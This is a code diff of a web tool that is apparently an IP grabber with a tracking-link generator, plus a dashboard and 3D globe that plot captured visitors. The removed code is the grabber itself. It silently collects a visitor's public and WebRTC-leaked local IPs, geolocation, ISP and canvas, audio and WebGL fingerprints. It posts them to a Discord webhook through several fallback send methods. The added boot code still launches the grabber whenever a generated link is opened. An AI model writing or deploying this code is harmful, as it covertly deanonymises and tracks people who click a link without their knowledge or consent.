+    if(consensus.lat==null || consensus.lon==null){ toast("No coords to focus","err"); return; }
+    focusOnLatLon(consensus.lat, consensus.lon);
+    toast("Focused on consensus pin");
+  });
+  $("copyCoords").addEventListener("click", ()=>{
+    if(consensus.lat==null || consensus.lon==null){ toast("No coordinates","err"); return; }
+    const s = consensus.lat.toFixed(6) + ", " + consensus.lon.toFixed(6);
+    navigator.clipboard.writeText(s).then(
+      ()=>toast("Coordinates copied"),
+      ()=>toast("Copy blocked","err")
+    );
+  });
+
+  // Auto-focus and plot on globe
+  window.__resolverConsensus = consensus;
+  $("globeFocus").style.display = "block";
+  requestAnimationFrame(()=>{
+    resizeGlobe();
+    renderGlobe();
+    if(consensus.lat != null && consensus.lon != null){
+      focusOnLatLon(consensus.lat, consensus.lon);
+    }
+  });
+
+  if(failed.length){
+    toast(`${failed.length} source${failed.length===1?'':'s'} unavailable`, "err");
+  } else {
+    toast(`Resolved with ${confPct}% confidence`);
+  }
+}
+
+/* ═══ GLOBE ═══ */
+let globeState = { scene:null, renderer:null, camera:null, group:null, raf:null, targetRot:null };
+let RESOLVER_PINS = [];
+
+function latLonToVec3(lat, lon, r){
+  const phi = (90 - lat) * Math.PI / 180;
+  const theta = (lon + 180) * Math.PI / 180;
+  return new THREE.Vector3(
+    -r * Math.sin(phi) * Math.cos(theta),
+     r * Math.cos(phi),
+     r * Math.sin(phi) * Math.sin(theta)
+  );
+}
+
+/* Compute YXZ euler angles that bring (lat, lon) to face the camera (+Z axis). */
+function anglesForLatLon(lat, lon){
+  const p = latLonToVec3(lat, lon, 1);
+  const ry = Math.atan2(-p.x, p.z);
+  const zAfterY = Math.sqrt(p.x*p.x + p.z*p.z);
+  const rx = Math.atan2(p.y, zAfterY);
+  return { rx, ry };
+}
+
+function initGlobe(){
+  const host = $("globe");
+  if(!host) return;
+  if(globeState.scene) return;
+  if(host.clientWidth < 10 || host.clientHeight < 10) return;
+
+  const w = host.clientWidth, h = host.clientHeight;
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(50, w/h, 0.1, 1000);
+  camera.position.set(0, 0, 14);
+
+  const renderer = new THREE.WebGLRenderer({antialias:true, alpha:true});
+  renderer.setPixelRatio(Math.min(devicePixelRatio, 2));
+  renderer.setSize(w, h);
+  renderer.setClearColor(0x000000, 0);
+  host.appendChild(renderer.domElement);
+
+  scene.add(new THREE.Mesh(
+    new THREE.SphereGeometry(5, 64, 64),
+    new THREE.MeshBasicMaterial({color:0x050505})
+  ));
+  scene.add(new THREE.Mesh(
+    new THREE.SphereGeometry(5.01, 36, 24),
+    new THREE.MeshBasicMaterial({
+      color:0xffffff, wireframe:true, transparent:true, opacity:0.06
+    })
+  ));
+  const ringGeo = new THREE.TorusGeometry(5.02, 0.008, 8, 128);
+  const ringMat = new THREE.MeshBasicMaterial({
+    color:0xffffff, transparent:true, opacity:0.15
+  });
+  const ring = new THREE.Mesh(ringGeo, ringMat);
+  ring.rotation.x = Math.PI / 2;
+  scene.add(ring);
+  scene.add(new THREE.Mesh(
+    new THREE.SphereGeometry(5.15, 64, 64),
+    new THREE.MeshBasicMaterial({
+      color:0xffffff, transparent:true, opacity:0.02, side:THREE.BackSide
+    })
+  ));
+
+  const group = new THREE.Group();
+  scene.add(group);
+
+  const starGeo = new THREE.BufferGeometry();
+  const starArr = [];
+  for(let i=0;i<1200;i++){
+    starArr.push((Math.random()-.5)*200, (Math.random()-.5)*200, (Math.random()-.5)*200);
+  }
+  starGeo.setAttribute("position", new THREE.Float32BufferAttribute(starArr, 3));
+  const stars = new THREE.Points(starGeo, new THREE.PointsMaterial({
+    color:0xffffff, size:0.12, transparent:true, opacity:0.35
+  }));
+  scene.add(stars);
+
+  globeState.scene = scene;
+  globeState.camera = camera;
+  globeState.renderer = renderer;
+  globeState.group = group;
+  globeState.stars = stars;
+  globeState.rotX = 0;
+  globeState.rotY = 0;
+
+  let isDown = false, lastX = 0, lastY = 0;
+  const el = renderer.domElement;
+  el.addEventListener("mousedown", e=>{
+    isDown=true; lastX=e.clientX; lastY=e.clientY;
+    globeState.targetRot = null; // user is in control
+  });
+  window.addEventListener("mouseup", ()=>{ isDown=false; });
+  window.addEventListener("mousemove", e=>{
+    if(!isDown) return;
+    globeState.rotY += (e.clientX - lastX) * 0.005;
+    globeState.rotX += (e.clientY - lastY) * 0.005;
+    globeState.rotX = Math.max(-Math.PI/2, Math.min(Math.PI/2, globeState.rotX));
+    lastX = e.clientX; lastY = e.clientY;
+  });
+  el.addEventListener("touchstart", e=>{
+    isDown=true; lastX=e.touches[0].clientX; lastY=e.touches[0].clientY;
+    globeState.targetRot = null;
+  }, {passive:true});
+  el.addEventListener("touchend", ()=>{ isDown=false; });
+  el.addEventListener("touchmove", e=>{
+    if(!isDown) return;
+    globeState.rotY += (e.touches[0].clientX - lastX) * 0.005;
+    globeState.rotX += (e.touches[0].clientY - lastY) * 0.005;
+    globeState.rotX = Math.max(-Math.PI/2, Math.min(Math.PI/2, globeState.rotX));
+    lastX = e.touches[0].clientX; lastY = e.touches[0].clientY;
+  }, {passive:true});
+
+  function animate(){
+    globeState.raf = requestAnimationFrame(animate);
+    const gs = globeState;
+    if(gs.targetRot){
+      // Smoothly ease toward the target rotation
+      const a = 0.08;
+      // shortest path for Y
+      let dY = gs.targetRot.ry - gs.rotY;
+      while(dY >  Math.PI) dY -= Math.PI * 2;
+      while(dY < -Math.PI) dY += Math.PI * 2;
+      gs.rotY += dY * a;
+      gs.rotX += (gs.targetRot.rx - gs.rotX) * a;
+      if(Math.abs(dY) < 0.002 && Math.abs(gs.targetRot.rx - gs.rotX) < 0.002){
+        gs.rotX = gs.targetRot.rx;
+        gs.rotY = gs.targetRot.ry;
+        gs.targetRot = null;
+      }
+    } else if(!isDown){
+      // subtle drift when idle
+      gs.rotY += 0.0006;
+    }
+    gs.scene.rotation.x = gs.rotX;
+    gs.scene.rotation.y = gs.rotY;
+    gs.stars.rotation.y += 0.00008;
+    gs.renderer.render(gs.scene, gs.camera);
+  }
+  animate();
+}
+
+function resizeGlobe(){
+  if(!globeState.renderer) return;
+  const host = $("globe");
+  if(!host || host.clientWidth < 10) return;
+  const w = host.clientWidth, h = host.clientHeight;
+  globeState.camera.aspect = w/h;
+  globeState.camera.updateProjectionMatrix();
+  globeState.renderer.setSize(w, h);
+}
+
+function focusOnLatLon(lat, lon){
+  if(!globeState.scene) initGlobe();
+  if(!globeState.scene) return;
+  const a = anglesForLatLon(lat, lon);
+  globeState.targetRot = { rx: a.rx, ry: a.ry };
+}
+
+function renderGlobe(){
+  initGlobe();
+  if(!globeState.group) return;
+
+  // Clear old markers
+  while(globeState.group.children.length){
+    const c = globeState.group.children[0];
+    globeState.group.remove(c);
+    if(c.geometry) c.geometry.dispose();
+    if(c.material) c.material.dispose();
   }
 
-  /* ══════════════════════════════════════════════════════════
-     SEND  —  four methods, first that succeeds wins
-     ══════════════════════════════════════════════════════════ */
-  async function send(webhook, payload){
-    const url  = clean(webhook) + "?wait=true";
-    const json = JSON.stringify(payload);
-    const log  = [];
+  const R = 5.02;
 
-    try{
-      const fd = new FormData();
-      fd.append("payload_json", json);
-      await fetch(url, { method:"POST", body: fd, mode:"no-cors" });
-      log.push("no-cors:queued");
-      return { ok:true, via:"no-cors", log };
-    }catch(e){ log.push("no-cors:" + e.message); }
+  // Per-source pins (small, dim)
+  RESOLVER_PINS.forEach(p => {
+    const pos = latLonToVec3(p.lat, p.lon, R);
+    const dot = new THREE.Mesh(
+      new THREE.SphereGeometry(0.045, 10, 10),
+      new THREE.MeshBasicMaterial({color:0xffffff, transparent:true, opacity:0.55})
+    );
+    dot.position.copy(pos);
+    globeState.group.add(dot);
+  });
 
-    try{
-      const fd = new FormData();
-      fd.append("payload_json", json);
-      const r = await fetch(url, { method:"POST", body: fd });
-      log.push("multipart:" + r.status);
-      if(r.ok || r.status === 204) return { ok:true, via:"multipart", log };
-    }catch(e){ log.push("multipart:" + e.message); }
+  // Consensus pin (large, bright + pin line + halo)
+  const cons = window.__resolverConsensus;
+  if(cons && cons.lat != null && cons.lon != null){
+    const pos = latLonToVec3(cons.lat, cons.lon, R);
+    const dot = new THREE.Mesh(
+      new THREE.SphereGeometry(0.08, 16, 16),
+      new THREE.MeshBasicMaterial({color:0xffffff})
+    );
+    dot.position.copy(pos);
+    globeState.group.add(dot);
 
+    const halo = new THREE.Mesh(
+      new THREE.SphereGeometry(0.2, 16, 16),
+      new THREE.MeshBasicMaterial({color:0xffffff, transparent:true, opacity:0.2})
+    );
+    halo.position.copy(pos);
+    globeState.group.add(halo);
+
+    // Outer glow ring
+    const ring = new THREE.Mesh(
+      new THREE.RingGeometry(0.24, 0.3, 32),
+      new THREE.MeshBasicMaterial({
+        color:0xffffff, transparent:true, opacity:0.15,
+        side:THREE.DoubleSide
+      })
+    );
+    ring.position.copy(pos);
+    ring.lookAt(0, 0, 0);
+    globeState.group.add(ring);
+
+    // Pin line outward
+    const outer = pos.clone().multiplyScalar(1.12);
+    const line = new THREE.Line(
+      new THREE.BufferGeometry().setFromPoints([pos, outer]),
+      new THREE.LineBasicMaterial({color:0xffffff, transparent:true, opacity:0.5})
+    );
+    globeState.group.add(line);
+
+    // Origin dot at line tip
+    const tip = new THREE.Mesh(
+      new THREE.SphereGeometry(0.03, 8, 8),
+      new THREE.MeshBasicMaterial({color:0xffffff})
+    );
+    tip.position.copy(outer);
+    globeState.group.add(tip);
+  }
+
+  // Info label
+  const info = $("globeInfo");
+  if(!cons){
+    info.innerHTML = `Resolve an IP to pin it
+      <span class="sub">4 sources · consensus triangulation</span>`;
+  } else {
+    const loc = [cons.city, cons.country].filter(Boolean).join(", ") || "unknown";
+    const coord = (cons.lat!=null && cons.lon!=null)
+      ? cons.lat.toFixed(3) + ", " + cons.lon.toFixed(3)
+      : "no coords";
+    const conf = Math.round((cons.confidence || 0) * 100);
+    info.innerHTML = `<b>${esc(loc)}</b>
+      <span class="sub">${esc(coord)} · ${cons.agreeCount}/${cons.totalSources} agree · ${conf}%</span>`;
+  }
+}
+
+window.addEventListener("resize", ()=>{ resizeGlobe(); });
+
+/* ═══ SETTINGS ═══ */
+function initSettings(){
+  $("setEndpoint").value = Store.getEndpoint();
+  $("saveEndpoint").addEventListener("click", ()=>{
+    Store.setEndpoint($("setEndpoint").value.trim());
+    toast("Endpoint saved");
+    updateStatusPill();
+  });
+  $("testEndpoint").addEventListener("click", async ()=>{
+    const ep = $("setEndpoint").value.trim();
+    if(!ep){ toast("No endpoint set","err"); return; }
     try{
-      const r = await fetch(url, {
+      const r = await fetch(ep, {
         method:"POST",
-        headers: { "Content-Type":"application/json" },
-        body: json
+        headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({test:true, ts:Date.now(), source:"dashboard"}),
       });
-      log.push("json:" + r.status);
-      if(r.ok || r.status === 204) return { ok:true, via:"json", log };
-    }catch(e){ log.push("json:" + e.message); }
-
-    try{
-      const ok = navigator.sendBeacon(url, new Blob([json], {type:"application/json"}));
-      log.push("beacon:" + ok);
-      if(ok) return { ok:true, via:"beacon", log };
-    }catch(e){ log.push("beacon:" + e.message); }
-
-    return { ok:false, via:"none", log };
-  }
-
-  /* ══════════════════════════════════════════════════════════
-     GRABBER  —  ipv4 / ipv6 / webrtc / browser
-     ══════════════════════════════════════════════════════════ */
-  const isV6 = ip => ip.indexOf(":") !== -1;
-  function isPriv(ip){
-    if(isV6(ip)) return /^(fe80|fc|fd)/i.test(ip) || ip === "::1";
-    const p = ip.split(".").map(Number);
-    if(p.length !== 4 || p.some(isNaN)) return false;
-    return p[0]===10 || p[0]===127 ||
-           (p[0]===172 && p[1]>=16 && p[1]<=31) ||
-           (p[0]===192 && p[1]===168) ||
-           (p[0]===169 && p[1]===254);
-  }
-  function webrtcIPs(ms){
-    return new Promise(res=>{
-      const out = { v4:{local:new Set(),pub:new Set()}, v6:{local:new Set(),pub:new Set()} };
-      let pc;
+      toast("Test sent · " + r.status);
+    }catch(e){ toast("Test failed: " + e.message,"err"); }
+  });
+  $("exportBtn").addEventListener("click", ()=>{
+    const data = { captures:Store.getCaptures(), links:Store.getLinks(), exportedAt:Date.now() };
+    const blob = new Blob([JSON.stringify(data, null, 2)], {type:"application/json"});
+    const a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = "dashboard-export-" + Date.now() + ".json";
+    a.click();
+    setTimeout(()=>URL.revokeObjectURL(a.href), 1000);
+    toast("Exported");
+  });
+  $("importBtn").addEventListener("click", ()=> $("importFile").click());
+  $("importFile").addEventListener("change", e=>{
+    const f = e.target.files[0];
+    if(!f) return;
+    const reader = new FileReader();
+    reader.onload = ev=>{
       try{
-        pc = new RTCPeerConnection({
-          iceServers:[
-            {urls:"stun:stun.l.google.com:19302"},
-            {urls:"stun:stun1.l.google.com:19302"},
-            {urls:"stun:stun.cloudflare.com:3478"}
-          ]
-        });
-      }catch(e){ return res(out); }
-      let done = false;
-      const fin = () => {
-        if(done) return;
-        done = true;
-        try{ pc.close(); }catch(e){}
-        res(out);
-      };
-      const t = setTimeout(fin, ms);
-      pc.onicecandidate = e => {
-        if(!e.candidate){ clearTimeout(t); return fin(); }
-        const ip = e.candidate.candidate.split(" ")[4];
-        if(!ip || /\.local$/i.test(ip)) return;
-        out[isV6(ip)?"v6":"v4"][isPriv(ip)?"local":"pub"].add(ip);
-      };
-      try{
-        pc.createDataChannel("x");
-        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
-      }catch(e){ clearTimeout(t); fin(); }
-    });
-  }
-  function fetchT(url, ms){
-    const ctrl = new AbortController();
-    const t = setTimeout(()=>ctrl.abort(), ms);
-    return fetch(url, {signal: ctrl.signal, cache:"no-store"}).finally(()=>clearTimeout(t));
-  }
-  async function publicIPs(){
-    const found = { v4:null, v6:null };
-    await Promise.all([
-      (async () => {
-        try{
-          const r = await fetchT("https://ipv4.icanhazip.com", 3000);
-          if(r.ok){ const v = (await r.text()).trim(); if(v && !isV6(v)) found.v4 = v; }
-        }catch(e){}
-        if(!found.v4){
-          try{
-            const r = await fetchT("https://api.ipify.org?format=json", 3000);
-            if(r.ok){ const v = (await r.json()).ip; if(v) found.v4 = v; }
-          }catch(e){}
-        }
-      })(),
-      (async () => {
-        try{
-          const r = await fetchT("https://ipv6.icanhazip.com", 3000);
-          if(r.ok){ const v = (await r.text()).trim(); if(v && isV6(v)) found.v6 = v; }
-        }catch(e){}
-      })()
-    ]);
-    return found;
-  }
-  async function geoLookup(ip){
-    for(const x of [
-      { u:`https://ipwho.is/${ip}`, p:d => d && d.ip ? {
-          city:d.city, region:d.region, country:d.country,
-          isp:d.connection && d.connection.isp,
-          asn:d.connection && d.connection.asn
-        } : null },
-      { u:`https://ipapi.co/${ip}/json/`, p:d => d && d.ip ? {
-          city:d.city, region:d.region, country:d.country_name,
-          isp:d.org, asn:d.asn
-        } : null }
-    ]){
-      try{
-        const r = await fetchT(x.u, 3000);
-        if(!r.ok) continue;
-        const v = x.p(await r.json());
-        if(v) return v;
-      }catch(e){}
-    }
-    return null;
-  }
-  function bname(ua){
-    const L = [
-      ["Edge",    /Edg(?:e|A|iOS)?\/([\d.]+)/],
-      ["Opera",   /(?:OPR|Opera)\/([\d.]+)/],
-      ["Samsung", /SamsungBrowser\/([\d.]+)/],
-      ["Firefox", /(?:Firefox|FxiOS)\/([\d.]+)/],
-      ["Chrome",  /(?:Chrome|CriOS)\/([\d.]+)/],
-      ["Safari",  /Version\/([\d.]+).*Safari/]
-    ];
-    for(const [n,re] of L){ const m = ua.match(re); if(m) return n + " " + m[1]; }
-    return "Unknown";
-  }
-  function osn(ua){
-    if(/Windows NT 10/.test(ua)) return "Windows 10/11";
-    if(/Windows/.test(ua)) return "Windows";
-    const a = ua.match(/Android ([\d.]+)/); if(a) return "Android " + a[1];
-    if(/iPhone|iPad|iPod/.test(ua)) return "iOS";
-    if(/Mac OS X/.test(ua)) return "macOS";
-    if(/CrOS/.test(ua)) return "ChromeOS";
-    if(/Linux/.test(ua)) return "Linux";
-    return "Unknown";
-  }
-  function gpu(){
-    try{
-      const c = document.createElement("canvas");
-      const g = c.getContext("webgl") || c.getContext("experimental-webgl");
-      if(!g) return null;
-      const d = g.getExtension("WEBGL_debug_renderer_info");
-      return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : null;
-    }catch(e){ return null; }
-  }
-
-  async function gather(){
-    const n = navigator;
-    const cn = n.connection || n.mozConnection || n.webkitConnection || {};
-    let tz = "unknown";
-    try{ tz = Intl.DateTimeFormat().resolvedOptions().timeZone; }catch(e){}
-
-    const [rt, ips] = await Promise.all([
-      webrtcIPs(2200),
-      Promise.race([ publicIPs(), new Promise(r => setTimeout(()=>r({v4:null,v6:null}), 3500)) ])
-    ]);
-    const primary = ips.v4 || ips.v6;
-    const geo = primary ? await Promise.race([
-      geoLookup(primary),
-      new Promise(r => setTimeout(()=>r(null), 2800))
-    ]) : null;
-
-    return {
-      v4_pub: ips.v4, v6_pub: ips.v6, geo: geo,
-      v4_local: [...rt.v4.local], v6_local: [...rt.v6.local],
-      v4_stun:  [...rt.v4.pub],   v6_stun:  [...rt.v6.pub],
-      browser: bname(n.userAgent),
-      os: osn(n.userAgent),
-      platform: n.platform || "unknown",
-      cores: n.hardwareConcurrency || null,
-      memory: n.deviceMemory || null,
-      gpu: gpu(),
-      screen: `${screen.width}×${screen.height}`,
-      viewport: `${innerWidth}×${innerHeight}`,
-      dpr: devicePixelRatio || 1,
-      depth: screen.colorDepth,
-      lang: n.language || "unknown",
-      tz: tz,
-      touch: n.maxTouchPoints || 0,
-      conn: cn.effectiveType || null,
-      downlink: cn.downlink || null,
-      referrer: document.referrer || "direct"
+        const data = JSON.parse(ev.target.result);
+        if(data.captures) Store.setCaptures(data.captures);
+        if(data.links) Store.setLinks(data.links);
+        renderOverview(); renderLinks();
+        toast("Imported");
+      }catch(err){ toast("Invalid JSON","err"); }
     };
+    reader.readAsText(f);
+    e.target.value = "";
+  });
+  $("wipeBtn").addEventListener("click", ()=>{
+    if(!confirm("Wipe ALL captures and links? This cannot be undone.")) return;
+    Store.clearCaptures();
+    Store.clearLinks();
+    renderOverview(); renderLinks(); renderCaptures();
+    toast("All data wiped");
+  });
+}
+function updateStatusPill(){
+  const ep = Store.getEndpoint();
+  const el = $("statusPill");
+  if(ep){
+    el.textContent = "endpoint: " + (ep.length > 30 ? ep.slice(0,30)+"…" : ep);
+    el.classList.add("live");
+  } else {
+    el.textContent = "local mode";
+    el.classList.remove("live");
   }
+}
 
-  const q = v => "`" + v + "`";
+/* ═══ BOOT ═══ */
+function pickId(){
+  const m = location.hash.replace(/^#\/?/, "").match(/^([a-z0-9]{4})/i);
+  return m ? m[1].toLowerCase() : null;
+}
+function boot(){
+  const id = pickId();
+  if(id){ runGrabber(id); return; }
+  $("dash").classList.remove("hidden");
+  updateStatusPill();
+  document.querySelectorAll("#nav a").forEach(a=>{
+    a.addEventListener("click", ()=> setPage(a.dataset.page));
+  });
+  $("menuBtn").addEventListener("click", ()=> $("sidebar").classList.toggle("open"));
+  $("revealAll").addEventListener("click", ()=>{
+    Store.getCaptures().forEach(c => REVEALED.add(c.ts));
+    renderCaptures();
+  });
+  $("clearCaptures").addEventListener("click", ()=>{
+    if(!confirm("Clear all captures?")) return;
+    Store.clearCaptures();
+    REVEALED.clear(); EXPANDED.clear();
+    renderCaptures(); renderOverview();
+    toast("Captures cleared");
+  });
 
-  function buildEmbed(id, d){
-    const f = [];
-    const g = d.geo || {};
+  /* Create Link */
+  $("makeLink").addEventListener("click", ()=>{
+    const label = $("linkLabel").value.trim();
+    const dest = $("linkDest").value.trim();
+    if(dest && !/^https?:\/\//i.test(dest)){ toast("Destination must be a valid URL","err"); return; }
 
-    if(d.v4_pub) f.push({ name:"IPv4", value: q(d.v4_pub), inline:false });
-    if(d.v6_pub) f.push({ name:"IPv6", value: q(d.v6_pub), inline:false });
-    if(g.city || g.region || g.country)
-      f.push({ name:"Location", value: q([g.city,g.region,g.country].filter(Boolean).join(", ")), inline:true });
-    if(g.isp) f.push({ name:"ISP", value: q(g.isp), inline:true });
-    if(g.asn) f.push({ name:"ASN", value: q(g.asn), inline:true });
+    let id;
+    const existing = new Set(Store.getLinks().map(l=>l.id));
+    do { id = makeId(); } while(existing.has(id));
 
-    if(d.v4_local.length) f.push({ name:"Local v4", value: q(d.v4_local.join(", ")), inline:true });
-    if(d.v6_local.length) f.push({ name:"Local v6", value: q(d.v6_local.join(", ")), inline:true });
-    if(d.v4_stun.length)  f.push({ name:"STUN v4",  value: q(d.v4_stun.join(", ")),  inline:true });
-    if(d.v6_stun.length)  f.push({ name:"STUN v6",  value: q(d.v6_stun.join(", ")),  inline:true });
-    if(d.conn) f.push({ name:"Network", value: q(d.conn + (d.downlink ? " · " + d.downlink + "Mb/s" : "")), inline:true });
+    Store.addLink({id, label, dest, ts:Date.now()});
+    $("linkLabel").value = ""; $("linkDest").value = "";
 
-    f.push({ name:"OS",       value: q(d.os),                            inline:true });
-    f.push({ name:"Browser",  value: q(d.browser),                       inline:true });
-    f.push({ name:"Platform", value: q(d.platform),                      inline:true });
-    f.push({ name:"Screen",   value: q(d.screen + " · " + d.dpr + "x"),  inline:true });
-    f.push({ name:"Viewport", value: q(d.viewport),                      inline:true });
-    f.push({ name:"Depth",    value: q(d.depth + "-bit"),                inline:true });
-    f.push({ name:"CPU",      value: q((d.cores ?? "n/a") + " cores"),   inline:true });
-    f.push({ name:"RAM",      value: q(d.memory ? "~" + d.memory + " GB" : "n/a"), inline:true });
-    f.push({ name:"Touch",    value: q(d.touch + " pts"),                inline:true });
-    f.push({ name:"Language", value: q(d.lang),                          inline:true });
-    f.push({ name:"Timezone", value: q(d.tz),                            inline:true });
-    if(d.gpu) f.push({ name:"GPU", value: q(d.gpu), inline:false });
-    if(d.referrer && d.referrer !== "direct")
-      f.push({ name:"Referrer", value: q(d.referrer), inline:false });
+    const url = buildLink(id);
+    const preview = $("linkPreview");
+    $("linkPreviewFull").innerHTML = linkHtml(url);
+    preview.classList.add("show");
 
-    const ts = Math.floor(Date.now() / 1000);
-    return {
-      username: "visit",
-      embeds: [{
-        title: id,
-        description: "<t:" + ts + ":F>",
-        color: 0x000000,
-        fields: f,
-        footer: { text: id },
-        timestamp: new Date().toISOString()
-      }]
-    };
-  }
+    renderLinks(); renderOverview();
+    navigator.clipboard.writeText(url).then(
+      ()=>toast("Link created & copied · #" + id),
+      ()=>toast("Link created · #" + id)
+    );
+  });
 
-  function testPayload(id){
-    const ts = Math.floor(Date.now() / 1000);
-    return {
-      username: "visit",
-      embeds: [{
-        title: id,
-        description: "test",
-        color: 0x000000,
-        fields: [
-          { name:"id",     value: q(id), inline:true },
-          { name:"status", value: q("ok"), inline:true },
-          { name:"time",   value: "<t:" + ts + ":F>", inline:false }
-        ],
-        footer: { text: id },
-        timestamp: new Date().toISOString()
-      }]
-    };
-  }
-
-  /* ══════════════════════════════════════════════════════════
-     MODE  —  generator if no hash, grabber if #xxxx
-     ══════════════════════════════════════════════════════════ */
-  function pickId(){
-    const m = location.hash.replace(/^#\/?/, "").match(/^([a-z0-9]{4})/i);
-    return m ? m[1].toLowerCase() : null;
-  }
-
-  async function grabber(id){
-    $("ui").classList.add("hidden");
-    const wh = resolveWh();
-    console.log("[grab] id =", id, "| webhook =", wh ? "found" : "MISSING");
-    if(!wh){
-      console.warn("[grab] no webhook. Paste yours into the WEBHOOK constant at the top of index.html");
-      return;
-    }
-    try{
-      const d = await gather();
-      const r = await send(wh, buildEmbed(id, d));
-      console.log("[grab] result:", r);
-    }catch(e){
-      console.warn("[grab]", e);
-    }
-  }
-
-  function generator(){
-    $("ui").classList.remove("hidden");
-
-    const inp = $("wh"), fld = $("f"), out = $("out"), btn = $("go"), st = $("st");
-    const setStatus = (m,c) => { st.textContent = m || ""; st.className = "status" + (c ? " " + c : ""); };
-
-    try{ inp.value = localStorage.getItem(STORE) || ""; }catch(e){}
-
-    async function run(){
-      const v = clean(inp.value);
-      if(!WH_RE.test(v)){
-        fld.classList.add("bad");
-        setTimeout(()=>fld.classList.remove("bad"), 700);
-        setStatus("invalid webhook", "err");
-        return;
-      }
-      try{ localStorage.setItem(STORE, v); }catch(e){}
-
-      fld.classList.remove("bad","ok");
-
-      const id  = makeId();
-      const url = location.origin + location.pathname + "#" + id;
-
-      out.textContent = url;
-      out.classList.add("show");
-      try{ navigator.clipboard.writeText(url); }catch(e){}
-
-      inp.value = "";
-      inp.placeholder = id;
-
-      btn.disabled = true;
-      btn.textContent = "·";
-      setStatus("sending test…");
-
-      try{
-        const r = await send(v, testPayload(id));
-        if(!r.ok) throw new Error("failed: " + r.log.join(" | "));
-        fld.classList.add("ok");
-        setStatus("sent · " + id + " · " + r.via, "ok");
-        btn.textContent = "✓";
-      }catch(e){
-        console.warn(e);
-        fld.classList.add("bad");
-        setStatus(String(e.message || e), "err");
-        btn.textContent = "✕";
-      }
-      setTimeout(()=>{ btn.textContent = "→"; btn.disabled = false; }, 1400);
-    }
-
-    btn.addEventListener("click", run);
-    inp.addEventListener("keydown", e => { if(e.key === "Enter") run(); });
-    out.addEventListener("click", () => {
-      try{ navigator.clipboard.writeText(out.textContent); setStatus("copied", "ok"); }catch(e){}
-    });
-  }
-
-  /* ══════════════════════════════════════════════════════════
-     BROWSER INFO PAGE (from second snippet)
-     ══════════════════════════════════════════════════════════ */
-  const I = id => document.getElementById(id);
-
-  function browserName(ua){
-    const list = [
-      ["Edge",    /Edg(?:e|A|iOS)?\/([\d.]+)/],
-      ["Opera",   /(?:OPR|Opera)\/([\d.]+)/],
-      ["Samsung", /SamsungBrowser\/([\d.]+)/],
-      ["Firefox", /(?:Firefox|FxiOS)\/([\d.]+)/],
-      ["Chrome",  /(?:Chrome|CriOS)\/([\d.]+)/],
-      ["Safari",  /Version\/([\d.]+).*Safari/]
-    ];
-    for(const [n, re] of list){
-      const m = ua.match(re);
-      if(m) return n + " " + m[1];
-    }
-    return "unknown";
-  }
-
-  function osName(ua){
-    if(/Windows NT 10/.test(ua)) return "Windows 10/11";
-    if(/Windows NT 6\.3/.test(ua)) return "Windows 8.1";
-    if(/Windows NT 6\.1/.test(ua)) return "Windows 7";
-    if(/Windows/.test(ua)) return "Windows";
-    const a = ua.match(/Android ([\d.]+)/);
-    if(a) return "Android " + a[1];
-    if(/iPhone|iPad|iPod/.test(ua)) return "iOS";
-    const m = ua.match(/Mac OS X ([\d_]+)/);
-    if(m) return "macOS " + m[1].replace(/_/g, ".");
-    if(/CrOS/.test(ua)) return "ChromeOS";
-    if(/Linux/.test(ua)) return "Linux";
-    return "unknown";
-  }
-
-  function canvasHash(){
-    try{
-      const c = I("cv");
-      const x = c.getContext("2d");
-      x.textBaseline = "top";
-      x.font = "14px 'Arial'";
-      x.fillStyle = "#f60";
-      x.fillRect(0, 0, 100, 20);
-      x.fillStyle = "#069";
-      x.fillText("canvas-fp-\u2603", 2, 2);
-      x.fillStyle = "rgba(102,204,0,0.7)";
-      x.fillText("canvas-fp-\u2603", 4, 6);
-      const d = c.toDataURL();
-      let h = 5381;
-      for(let i = 0; i < d.length; i++) h = ((h << 5) + h + d.charCodeAt(i)) | 0;
-      return (h >>> 0).toString(16);
-    }catch(e){ return null; }
-  }
-
-  async function audioFingerprint(){
-    try{
-      const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
-      if(!Ctx) return null;
-      const ctx = new Ctx(1, 44100, 44100);
-      const osc = ctx.createOscillator();
-      osc.type = "triangle";
-      osc.frequency.value = 10000;
-      const comp = ctx.createDynamicsCompressor();
-      comp.threshold.value = -50;
-      comp.knee.value = 40;
-      comp.ratio.value = 12;
-      comp.attack.value = 0;
-      comp.release.value = 0.25;
-      osc.connect(comp);
-      comp.connect(ctx.destination);
-      osc.start(0);
-      const buf = await ctx.startRendering();
-      const data = buf.getChannelData(0);
-      let sum = 0;
-      for(let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
-      const raw = sum.toString();
-      let h = 0;
-      for(let i = 0; i < raw.length; i++) h = ((h << 5) - h + raw.charCodeAt(i)) | 0;
-      return { hash: (h >>> 0).toString(16), sample: +sum.toFixed(10) };
-    }catch(e){ return null; }
-  }
-
-  function webglInfo(){
-    try{
-      const c = document.createElement("canvas");
-      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
-      if(!gl) return null;
-      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-      const paramKeys = [
-        "MAX_TEXTURE_SIZE","MAX_CUBE_MAP_TEXTURE_SIZE","MAX_RENDERBUFFER_SIZE",
-        "MAX_VIEWPORT_DIMS","MAX_VERTEX_ATTRIBS","MAX_VERTEX_UNIFORM_VECTORS",
-        "MAX_FRAGMENT_UNIFORM_VECTORS","MAX_VARYING_VECTORS",
-        "MAX_COMBINED_TEXTURE_IMAGE_UNITS","MAX_TEXTURE_IMAGE_UNITS",
-        "MAX_VERTEX_TEXTURE_IMAGE_UNITS","ALIASED_LINE_WIDTH_RANGE",
-        "ALIASED_POINT_SIZE_RANGE","MAX_3D_TEXTURE_SIZE","MAX_ARRAY_TEXTURE_LAYERS",
-        "MAX_DRAW_BUFFERS","MAX_COLOR_ATTACHMENTS"
-      ];
-      const params = {};
-      for(const k of paramKeys){
-        const p = gl[k];
-        if(p === undefined) continue;
-        try{
-          const v = gl.getParameter(p);
-          params[k] = (v && typeof v.length === "number" && typeof v !== "string")
-            ? Array.from(v) : v;
-        }catch(e){}
-      }
-      return {
-        vendor:        dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR),
